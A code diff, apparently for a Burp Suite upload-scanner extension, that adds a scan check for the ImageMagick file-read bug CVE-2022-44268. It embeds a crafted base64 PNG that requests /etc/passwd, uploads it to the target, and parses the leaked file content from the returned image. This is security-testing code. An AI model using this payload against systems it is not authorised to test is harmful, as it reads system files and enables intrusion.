@@ -1083,6 +1083,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                 self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
                 self._imagetragick_cve_2016_3714_sleep(injector)
                 self._bad_manners_cve_2018_16323(injector)
+                self._imagemagick_cve_2022_44268(injector)
             # Magick (ImageMagick and GraphicsMagick) - generic, as these are exploiting features
             if injector.opts.modules['magick'].isSelected():
                 print "\nDoing Image-/GraphicsMagick checks"
@@ -1473,6 +1474,88 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                 colabs.extend(self._send_collaborator(injector, burp_colab, types, basename, content, issue, replace=replace))
 
         return colabs
+
+    def _imagemagick_cve_2022_44268(self, injector):
+        def _read_ztxt_chunk_from_png(imgdata):
+            image = BytesIO(imgdata)
+            signature = image.read(8)
+
+            if signature != struct.pack('8B', 137, 80, 78, 71, 13, 10, 26, 10):
+                print('Not a PNG file')
+                return
+
+            while True:
+                header = image.read(8)
+                length, type = struct.unpack('!I4s', header)
+
+                if type == b'IEND':
+                    return
+
+                data = image.read(length)
+                crc = image.read(4)
+
+                if type == b'zTXt':
+                    items = data.split(b'\x00', 2)
+
+                    chunk_data = zlib.decompress(items[-1]).decode('utf-8').split('\n')
+                    result = bytes(bytearray.fromhex(''.join(chunk_data[3:]))).decode('utf-8')
+
+                    return result
+
+
+        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "ImEtcPasswd"
+        content = 'iVBORw0KGgoAAAANSUhEUgAAAMgAAADICAYAAACtWK6eAAAAE3RFWHRwcm9maWxlAC9ldGMvcGFz' \
+                    'c3dkRlvXWAAABh1JREFUeAHt09tu4zgQRdHM/3/0zLwIcLuFyKIpsi6r0YBjRWSd2if7n39/fv7/' \
+                    '/+MfAgicECDICRSPEDgIEOQg4ROBEwIEOYHiEQIHAYIcJHwicELgQUFOpnmEQDICBElWmLhrCRBk' \
+                    'LW/TkhEgSLLCxF1LgCBreZuWjEBOQZJBFjcvAYLk7U7yBQQIsgCyEXkJECRvd5IvIECQBZCNyEuA' \
+                    'IG/d+YrAKwGCvNLwMwJvBAjyBsRXBF4JEOSVhp8ReCNAkDcgviLwSoAgrzSe/dntCQkQJGFpIq8j' \
+                    'QJB1rE1KSIAgCUsTeR0BgqxjbVJCAgRJWNrfkT15igBBniLr3hIECFKiRks8RYAgT5F1bwkCBClR' \
+                    'oyWeIkCQp8hWubf5HgRp/gdg/d8JEOR3Pn7bnABBmv8BWP93AgT5nY/fNidAkOZ/ADvXzzCbIBla' \
+                    'knEbAYJsQ29wBgIEydCSjNsIEGQbeoMzECBIhpZkvEtg2vsEmYbSRRUJEKRiq3aaRoAg01C6qCIB' \
+                    'glRs1U7TCBBkGkoXVSTwtyAVt7QTAoMECDIIzrEeBAjSo2dbDhIgyCA4x3oQIEiPnm05SGCpIIMZ' \
+                    'HUNgGwGCbENvcAYCBMnQkozbCBBkG3qDMxAgSIaWZNxGoIog2wAaXJsAQWr3a7svCRDkS4CO1yZA' \
+                    'kNr92u5LAgT5EqDjtQkQ5LJfL3QmQJDO7dv9kgBBLhF5oTMBgnRu3+6XBAhyicgLnQkQZGf7Zocn' \
+                    'QJDwFQm4kwBBdtI3OzwBgoSvSMCdBAiyk77Z4QkQJHxFYwGdmkOAIHM4uqUoAYIULdZacwgQZA5H' \
+                    'txQlQJCixVprDgGCzOHY6ZZWuxKkVd2WvUuAIHeJeb8VAYK0qtuydwkQ5C4x77ciQJBWdUdfNl4+' \
+                    'gsTrRKJABAgSqAxR4hEgSLxOJApEgCCByhAlHgGCxOtEoicIDN5JkEFwjvUgQJAePdtykABBBsE5' \
+                    '1oMAQXr0bMtBAgQZBOdYDwKfCNKDhC0ROCFAkBMoHiFwECDIQcInAicECHICxSMEDgIEOUj4ROCE' \
+                    'wGZBThJ5hEAgAgQJVIYo8QgQJF4nEgUiQJBAZYgSjwBB4nUiUSACdQUJBFmUvAQIkrc7yRcQIMgC' \
+                    'yEbkJUCQvN1JvoAAQRZANiIvAYIMdOdIHwIE6dO1TQcIEGQAmiN9CBCkT9c2HSBAkAFojvQhQJBY' \
+                    'XUsTjABBghUiTiwCBInVhzTBCBAkWCHixCJAkFh9SBOMAEGCFfJcHDePECDICDVn2hAgSJuqLTpC' \
+                    'gCAj1JxpQ4Agbaq26AgBgoxQc+ZPAoW/EaRwuVb7ngBBvmfohsIECFK4XKt9T4Ag3zN0Q2ECBClc' \
+                    'boXVdu9AkN0NmB+aAEFC1yPcbgIE2d2A+aEJECR0PcLtJkCQ3Q2Yv4vAR3MJ8hEmL3UlQJCuzdv7' \
+                    'IwIE+QiTl7oSIEjX5u39EQGCfITJS10JjAnSlZa92xEgSLvKLXyHAEHu0PJuOwIEaVe5he8QIMgd' \
+                    'Wt5tRyCcIO0asHBoAgQJXY9wuwkQZHcD5ocmQJDQ9Qi3mwBBdjdgfmgCnQQJXYRwMQkQJGYvUgUh' \
+                    'QJAgRYgRkwBBYvYiVRACBAlShBgxCRBkSi8uqUqAIFWbtdcUAgSZgtElVQkQpGqz9ppCgCBTMLqk' \
+                    'KgGCRG9Wvq0ECLIVv+HRCRAkekPybSVAkK34DY9OgCDRG5JvKwGCbMW/d7jp1wQIcs3IG40JEKRx' \
+                    '+Va/JkCQa0beaEyAII3Lt/o1AYJcM/LGfQJlThCkTJUWeYIAQZ6g6s4yBAhSpkqLPEGAIE9QdWcZ' \
+                    'AgQpU2WXRdbuSZC1vE1LRoAgyQoTdy0BgqzlbVoyAgRJVpi4awkQZC1v0yITOMlGkBMoHiFwECDI' \
+                    'QcInAicECHICxSMEDgIEOUj4ROCEAEFOoHiEwEFgliDHfT4RKEWAIKXqtMxsAgSZTdR9pQgQpFSd' \
+                    'lplNgCCzibqvFIEEgpTibZlkBAiSrDBx1xIgyFrepiUjQJBkhYm7lgBB1vI2LRmB3oIkK0vc9QQI' \
+                    'sp65iYkIECRRWaKuJ0CQ9cxNTESAIInKEnU9AYI8xNy1NQj8B6fhj0izycXRAAAAAElFTkSuQmCC'
+        content = content.decode("base64")
+
+        urrs = self._send_simple(injector, {('', '.png', 'image/png')}, basename, content, redownload=True)
+        for urr in urrs:
+            if urr and urr.download_rr:
+                resp = urr.download_rr.getResponse()
+                if resp:
+                    resp = FloydsHelpers.jb2ps(resp).split("\r\n\r\n", 1)[1]
+
+                    result = _read_ztxt_chunk_from_png(resp)
+
+                    if result and BurpExtender.REGEX_PASSWD.match(result.split('\n')[0]):
+                        name = "ImageMagick Local File Include"
+                        severity = "High"
+                        confidence = "Firm"
+
+                        detail = "A passwd-like response was downloaded when uploading a PNG file with a payload that " \
+                                 "tries to include /etc/passwd. Therefore arbitrary file read seems possible. " \
+                                 "See https://nvd.nist.gov/vuln/detail/CVE-2022-44268 for details. " \
+                                 "Extracted content: <br><br><pre>" + result + '</pre>'
+                        issue = self._create_issue_template(injector.get_brr(), name + " CVE-2022-44268", detail, confidence, severity)
+                        issue.httpMessagesPy = [urr.upload_rr, urr.download_rr]
+                        self._add_scan_issue(issue)
 
     def _ghostscript(self, injector, burp_colab):
 
